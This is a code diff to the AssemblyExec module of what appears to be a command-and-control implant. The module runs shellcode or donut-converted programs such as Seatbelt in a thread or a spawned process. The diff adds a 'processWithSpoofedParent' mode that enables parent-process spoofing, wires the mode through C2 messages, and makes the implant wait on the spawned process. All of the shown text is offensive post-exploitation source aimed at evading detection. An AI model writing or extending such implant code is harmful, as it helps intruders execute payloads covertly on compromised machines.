@@ -62,7 +62,7 @@ AssemblyExec::AssemblyExec()
 	m_spoofedParent="";
 	m_useSyscall=false;
 	m_isModeProcess = true;
-	m_isSpoofParent = true;
+	m_isSpoofParent = false;
 }
 
 AssemblyExec::~AssemblyExec()
@@ -80,8 +80,7 @@ std::string AssemblyExec::getInfo()
 	info += "Use -r to use a shellcode file.\n";
 	info += "If -e or -d are given, use donut to create the shellcode.\n";
 	info += "exemple:\n";
-	info += "- assemblyExec thread/process\n";
-	// info += "- assemblyExec setParentSpoof/unsetParentSpoof parentProcess\n";
+	info += "- assemblyExec thread/process/processWithSpoofedParent\n";
 	info += "- assemblyExec -r ./shellcode.bin\n";
 	info += "- assemblyExec -e ./program.exe arg1 arg2...\n";
 	info += "- assemblyExec -e ./Seatbelt.exe -group=system\n";
@@ -93,6 +92,7 @@ std::string AssemblyExec::getInfo()
 
 #define modeThread "0"
 #define modeProcess "1"
+#define modeprocessWithSpoofedParent "2"
 
 
 int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
@@ -103,11 +103,20 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 		if(splitedCmd[1]=="thread")
 		{
 			m_isModeProcess = false;
+			c2Message.set_returnvalue("thread mode.\n");
 			return 0;
 		}
 		else if(splitedCmd[1]=="process")
 		{
 			m_isModeProcess = true;
+			c2Message.set_returnvalue("process mode.\n");
+			return 0;
+		}
+		else if(splitedCmd[1]=="processWithSpoofedParent")
+		{
+			m_isModeProcess = true;
+			m_isSpoofParent = true;
+			c2Message.set_returnvalue("process mode with parent spoofing.\n");
 			return 0;
 		}
 		else
@@ -218,8 +227,11 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 
 		if(m_isModeProcess == false)
 			c2Message.set_args(modeThread);
-		else
+		else if(m_isModeProcess == true && m_isSpoofParent == false)
 			c2Message.set_args(modeProcess);
+		else if(m_isModeProcess == true && m_isSpoofParent == true)
+			c2Message.set_args(modeprocessWithSpoofedParent);
+
 		c2Message.set_pid(pid);
 		c2Message.set_cmd(cmd);
 		c2Message.set_instruction(splitedCmd[0]);
@@ -265,7 +277,15 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 		if(mode==modeThread)
 			m_isModeProcess = false;
 		else if(mode==modeProcess)
+		{
 			m_isModeProcess = true;
+			m_isSpoofParent = false;
+		}
+		else if(mode==modeprocessWithSpoofedParent)
+		{
+			m_isModeProcess = true;
+			m_isSpoofParent = true;
+		}
 	}
 
 	const std::string payload = c2Message.data();
@@ -834,6 +854,8 @@ int AssemblyExec::createNewProcess(const std::string& payload, const std::string
 	m_isProcessRuning=true;
 	m_processHandle = piProcInfo.hProcess;
 	std::thread thread([this] { killProcess(); });
+
+	WaitForSingleObject(piProcInfo.hProcess, INFINITE);
 
 	DWORD dwRead; 
     CHAR chBuf[BUFSIZE];
